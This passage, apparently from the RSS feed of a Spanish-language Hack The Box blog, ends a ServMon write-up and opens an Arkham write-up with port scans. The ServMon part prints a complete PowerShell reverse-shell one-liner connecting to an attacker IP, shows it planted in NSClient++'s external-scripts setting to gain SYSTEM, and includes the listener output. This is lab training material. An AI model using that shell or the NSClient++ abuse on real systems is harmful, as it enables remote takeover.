&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; Microsoft Corporation. All rights reserved.

C:&lt;span class=&#34;se&#34;&gt;\P&lt;/span&gt;rogram Files&lt;span class=&#34;se&#34;&gt;\N&lt;/span&gt;SClient++&amp;gt;whoami
whoami
nt authority&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem

C:&lt;span class=&#34;se&#34;&gt;\P&lt;/span&gt;rogram Files&lt;span class=&#34;se&#34;&gt;\N&lt;/span&gt;SClient++&amp;gt;type &lt;span class=&#34;s2&#34;&gt;&amp;#34;C:\Users\Administrator\Desktop\root.txt&amp;#34;&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;C:\Users\Administrator\Desktop\root.txt&amp;#34;&lt;/span&gt;
0f4b1f505e07879477a1ebdd7bccb170
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;checkexternalscripts-2&#34;&gt;CheckExternalScripts [2]&lt;/h2&gt;
&lt;p&gt;Creamos una &lt;a href=&#34;https://www.revshells.com/&#34;&gt;shell inversa&lt;/a&gt; con powershell y colocamos el puerto 80 a la escucha con netcat.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;powershell -nop -W hidden -noni -ep bypass -c &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$TCPClient&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; = New-Object Net.Sockets.TCPClient(&amp;#39;10.10.14.17&amp;#39;, 80);&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$NetworkStream&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; = &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$TCPClient&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;.GetStream();&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$StreamWriter&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; = New-Object IO.StreamWriter(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$NetworkStream&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;);function WriteToStream (&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$String&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;) {[byte[]]&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$script&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;:Buffer = 0..&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$TCPClient&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;.ReceiveBufferSize | % {0};&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$StreamWriter&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;.Write(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$String&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; + &amp;#39;SHELL&amp;gt; &amp;#39;);&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$StreamWriter&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;.Flush()}WriteToStream &amp;#39;&amp;#39;;while((&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$BytesRead&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; = &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$NetworkStream&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;.Read(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$Buffer&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;, 0, &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$Buffer&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;.Length)) -gt 0) {&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$Command&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; = ([text.encoding]::UTF8).GetString(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$Buffer&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;, 0, &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$BytesRead&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; - 1);&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$Output&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; = try {Invoke-Expression &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$Command&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; 2&amp;gt;&amp;amp;1 | Out-String} catch {&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; | Out-String}WriteToStream (&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$Output&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;)}&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$StreamWriter&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;.Close()&amp;#34;&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# œÄ ~/htb/servmon ‚ùØ sudo nc -lvp 80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Para obtener una shell utilizamos unicamente el modulo &lt;code&gt;CheckExternalScripts&lt;/code&gt; el cual contiene la opcion en configuracion del modulo para ejecutar comando. Nos dirigimos a modulos donde encontramos CheckExternalScripts y en configuraciones de &lt;code&gt;/settings/external scripts/scripts/default&lt;/code&gt; agregamos en &lt;strong&gt;command&lt;/strong&gt; nuestra shell inversa. Regresamos nuevamente al modulo CheckExternalScripts, desactivamos y activamos.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/servmon/2021-05-1302_36_50-Window.png&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/servmon/2021-05-1302_37_44-Window.png&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/servmon/2021-05-1302_38_41-Window.png&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/servmon/2021-05-1318_51_15-kali-VMwareWorkstation.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Lo cual ejecutar√° el comando previiamente creado (shell inversa) y con el logramos obtener una shell &lt;code&gt;nt authority\system&lt;/code&gt; y la flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;œÄ ~/htb/servmon ‚ùØ sudo nc -lvp &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt;
listening on &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;any&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt; ...
connect to &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.14.17&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; from 10.10.10.184 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.10.184&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;56431&lt;/span&gt;
SHELL&amp;gt; whoami
nt authority&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;ystem
SHELL&amp;gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop
SHELL&amp;gt; dir


    Directory: C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;esktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       13/05/2021     06:55             &lt;span class=&#34;m&#34;&gt;34&lt;/span&gt; root.txt


SHELL&amp;gt; &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; root.txt
034e2552b8082e806157bff19bab470c
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://assets.nagios.com/downloads/nagiosxi/docs/Configuring-The-Windows-Agent-NSClient++-for-Nagios-XI.pdf&#34;&gt;NSClient++ Windows Conf&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content:encoded>
        <dc:creator>Dany Sucuc</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/servmon/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/servmon/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>ftp</category>
            
          
            
              <category>smb</category>
            
          
            
              <category>crackmapexec</category>
            
          
            
              <category>nsclient&#43;&#43;</category>
            
          
            
              <category>powershell</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
            
              <category>windows</category>
            
          
        
        
      </item>
      
      <item>
        <title>Hack The Box - Arkham</title>
        <link>https://sckull.github.io/posts/arkham/</link>
        <pubDate>Sat, 10 Aug 2019 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 10 Aug 2019 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/arkham/</guid>
        <description>Arkham de HackTheBox con SO Windows, Encontramos un backup en SMB encriptado con binwalk obtuvimos archivos, uno de ellos es la configuracion de la &amp;ldquo;applicacion&amp;rdquo;, mediante este ultimo explotamos una vulnerabilidad de deserializacion en java utilizando el codigo de Apache MyFaces junto con ysoserial, lo que nos dio acceso a la maquina.</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/arkham/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;Arkham de HackTheBox con SO Windows, Encontramos un backup en SMB encriptado con binwalk obtuvimos archivos, uno de ellos es la configuracion de la &amp;ldquo;applicacion&amp;rdquo;, mediante este ultimo explotamos una vulnerabilidad de deserializacion en java utilizando el codigo de Apache MyFaces junto con ysoserial, lo que nos dio acceso a la maquina. Para el movimiento lateral utilizamos powershell con credenciales de borradores de correo electronico dentro de un backup. Finalmente cambiando de recurso compartido localmente logramos acceder a la carpeta del administrador.&lt;/p&gt;
&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/179&#34;&gt;Arkham&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Windows&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;30&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Media&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;10.10.10.130&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34; style=&#34;margin: auto;&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/8308&#34;&gt;MinatoTW&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/8308&#34; class=&#34;img_user_maker&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;a href=&#34;#single__title&#34; class=&#34;button&#34; style=&#34;width: 72px; height: 30px; pointer-events: none;&#34;  data-color=&#34;default&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&gt;
  &lt;span class=&#34;button__text&#34;&gt;
    Matrix
  &lt;/span&gt;
&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;div class=&#34;box&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-chart&#34; data-lang=&#34;chart&#34;&gt;{
   &amp;quot;type&amp;quot;:&amp;quot;radar&amp;quot;,
   &amp;quot;data&amp;quot;:{
      &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
      &amp;quot;datasets&amp;quot;:[
         {
            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[7.8, 8.1, 6, 4, 1.9],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
         },
         { 
            &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
            &amp;quot;data&amp;quot;:[6, 10, 5, 5, 0],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
         }
      ]
   },
    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;recon&#34;&gt;Recon&lt;/h1&gt;
&lt;h2 id=&#34;masscan--nmap&#34;&gt;Masscan &amp;amp; nmap&lt;/h2&gt;
&lt;p&gt;Escaneo de puertos tcp/udp.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/arkham# masscan -p1-65535,U:1-65535 10.10.10.130 --rate&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt; -e tun0

Starting masscan 1.0.4 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;http://bit.ly/14GZzcT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-03-25 19:10:12 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; hosts &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;131070&lt;/span&gt; ports/host&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
Discovered open port 49666/tcp on 10.10.10.130                                 
Discovered open port 139/tcp on 10.10.10.130                                   
Discovered open port 445/tcp on 10.10.10.130                                   
Discovered open port 135/tcp on 10.10.10.130                                   
Discovered open port 8080/tcp on 10.10.10.130                                  
Discovered open port 49667/tcp on 10.10.10.130
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Escaneo de servicios en puertos anteriormente encontrados.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@sckull:~/htb/arkham# nmap -sV -p 135,139,445,8080,49666,49667 10.10.10.130
Starting Nmap 7.70 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; at 2019-03-25 19:13 GMT
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.130
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.36s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
8080/tcp  open  http          Apache Tomcat 8.5.37
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

